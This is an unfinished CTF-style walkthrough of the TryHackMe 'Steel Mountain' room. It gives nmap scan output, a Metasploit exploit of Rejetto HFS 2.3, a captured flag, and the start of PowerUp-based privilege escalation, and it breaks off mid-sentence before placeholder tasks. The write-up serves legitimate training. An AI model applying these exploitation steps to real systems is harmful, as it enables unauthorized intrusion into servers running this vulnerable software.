# Steel Mountain
#### Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
#### [Room Link](1)

## Tasks
1. Introduction
  Start off by deploying the machine and run an nmap scan to start it off.
  `nmap -sV -sC -Pn -oN nmap_basic.txt ` with that we get a bit of output.

  While that runs we can open up the webpage, take a look at the page source and see our
  employee of the month's name is `Bill Harper`
  ![sourcebillhttp](2)
2. Initial Access
  Taking a look back at the nmap script we get these results
  ```
  ORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-03-21T18:53:21+00:00; +1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:fc:8c:3b:e0:f4 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-21T18:53:16
|_  start_date: 2020-03-21T18:49:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.35 seconds
  ```

  Looking at the results we have another web server on port 8080, which we can check out below.
  ![upload8080page](3)

  We can see it is running `Rejetto HTTP File Server`. after doing a quick google search we find an exploit [here](4)
  Using `searchsploit Rejetto HTTP File Server` we see there is a metasploit module to exploit it. We can start with that then try manually exploitation.
  Loading up msf with `msfconsole` searching for the exploit with  `search rejetto` then loading up the exploit with `use exploit/windows/http/rejetto_hfs_exec` after that we set the correct RHOST and RPORT then `exploit`.

  We get the exploit to run and see with `getuid` that we are on the user `bill`. Navigate to his Desktop directory and we can find the flag! `b04763b6fcf51fcd7c13abc7db4fd365`

3. Privilege Escalation
  For privilege escalation we are using the common [PowerSploit Repo](5) and PowerUp.ps1 to see what
  options we have to escalate. First copy over the PowerUp.ps1 script to your current directory. Upload it via your meterpreter shell with `upload PowerUp.ps1`. After it uploads drop into a meterpreter powershell shell with  `load powershell` then she
4. Sample
5. Sample

## Review

For links
[1]:https://tryhackme.com/room/steelmountain
[2]:.\resources\steel_source80.png
[3]:.\resources\steel_upload8080.png
[4]:https://www.exploit-db.com/exploits/34668
[5]:https://github.com/PowerShellMafia/PowerSploit
